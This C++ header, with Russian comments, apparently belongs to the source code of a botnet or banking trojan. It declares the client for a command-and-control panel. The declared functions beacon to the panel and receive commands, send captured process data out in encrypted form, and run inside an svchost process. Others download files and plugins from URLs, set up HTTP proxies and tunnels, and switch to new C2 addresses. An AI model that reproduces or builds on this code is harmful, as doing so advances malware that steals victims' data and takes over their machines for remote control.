#include "core\core.h"
#include "core\debug.h"
#include "core\pipe.h"

namespace AdminPanel
{

const int DEF = 0; //обычная админка
const int AZ = 1; //аз админка

//отключает предупреждение на массив нулевого размера
#pragma warning ( disable : 4200 )

struct MsgSendData
{
	char nameData[32]; //название отправляемых данных (поле data)
	char nameProcess[32]; //имя процесса (поле process)
	uint hprocess; //хендл процесса (поле idprocess)
	bool file; //true - отправляются пост запросом как ContentMultipart, false - как ContentWebForm
	char fileName[32]; //имя файла для отправляемых данных
	int c_data;
	char data[0];
};

//передаваемы для команды CmdLog коды логов
struct MsgLog
{
	bool flush; //накопленный лог нужно отослать
	int code; //код сообщения
};

bool Init();
void Release();

//возвращает хост текущей админки
//type - 0 Config::Hosts (обычная админка), 1 - Config::HostsAZ (админка AZ)
bool GetHostAdmin( int type, StringBuilder& host );
//возвращает все зашитые хосты указанной админки, разделяются символом '|'
bool GetHosts( int type, StringBuilder& hosts );
//возвращает текст команды от админки
bool GetCmd( StringBuilder& cmd );
//отпаравляет данные в админку
bool SendData( MsgSendData* data );
//шифрует массив данных, в dst будет в бинарном виде IV (8 байт) + шифрованные данные
bool EncryptToBin( const void* data, int c_data, Mem::Data& dst );
inline bool EncryptToBin( const Mem::Data& src, Mem::Data& dst )
{
	return EncryptToBin( src.Ptr(), src.Len(), dst );
}
//шифрует массив данных и переводит их в base64 с зменой некоторых символов, в dst будет IV + шифрованные данные в base64 (итогом будет строка)
bool EncryptToText( const void* data, int c_data, StringBuilder& dst );
inline bool EncryptToText( const Mem::Data& src, StringBuilder& dst )
{
	return EncryptToText( src.Ptr(), src.Len(), dst );
}
//расшифровывает строку
bool Decrypt( const Mem::Data& src, Mem::Data& dst );

}

DWORD WINAPI AdminPanelProcess( void* );
DWORD WINAPI AdminPanelThread( void* );
//запуск svchost процесса работы с админкой
bool RunAdminPanelInSvchost();
//запуск потока работы с админкой, если thread = true, то запускается в отдельном потоке, иначе в текущем
bool RunAdminPanel( bool thread = true );

class PipeInetRequest : public PipeServer
{

	public:
		enum 
		{
			CmdGetCmd,		//отстук в админку и получение команды
			CmdSendData,	//отсылка данных в админку
			CmdLoadFile,	//загрузка файла по урлу 
			CmdLoadPlugin,	//загрузка плагина
			CmdTunnelHttp,	//создает http прокси
			CmdTunnelIpPort, //создает сквозной туннель на указанный адрес
			CmdSetProxy,	//установить прокси
			CmdDelProxy,	//удалить прокси
			CmdGetProxy,	//вернуть установленные прокси
			CmdDupl,		//запись данных идущих в админку в файлы
			CmdNewAdminka,	//смена адреса админки
			CmdSendDataCrossGet, //отсылка строки в админку через GET запрос (передаваемая строка должна обязательно передаваться с завершающим нулем)
			CmdLog			//отсылка лога в админку, точнее отсылаются числа (коды фраз)
		};

	private:

		virtual int Handler( Pipe::Msg* msgIn, void** msgOut );

		//отправляет команду аргументом которой является строка
		static bool SendString( const char* namePipe, int cmd, const char* s, Pipe::typeReceiverPipeAnswer funcReceiver, const char* nameReceiver, DWORD tag = 0 );

		Mem::Data result; //для возврата каких либо результатов

	public:

		PipeInetRequest();
		~PipeInetRequest();

		//данные команду предназначены для данного класса и они отправляются через менеджер
		//ниже следующие функции вызываются менеджером.
		//Пользовательскому нужно вызывать аналогичные из класса менеджера
		//namePipe это имя канала, зарегестрированого в менеджере, который может проводить операции с инетом

		//регистрация в менеджере
		bool Reg( int priority ); 
		//отстук в админку и получение команды
		static bool GetCmd( const char* namePipe, Pipe::typeReceiverPipeAnswer funcReceiver, const char* nameReceiver = 0 );
		static bool SendData( const char* namePipe, const AdminPanel::MsgSendData* data, int c_data );
		static bool LoadFile( const char* namePipe, const char* url, Pipe::typeReceiverPipeAnswer funcReceiver, const char* nameReceiver = 0, DWORD tag = 0 );
		static bool LoadPlugin( const char* namePipe, const char* plugin, Pipe::typeReceiverPipeAnswer funcReceiver, const char* nameReceiver = 0, DWORD tag = 0 );
};
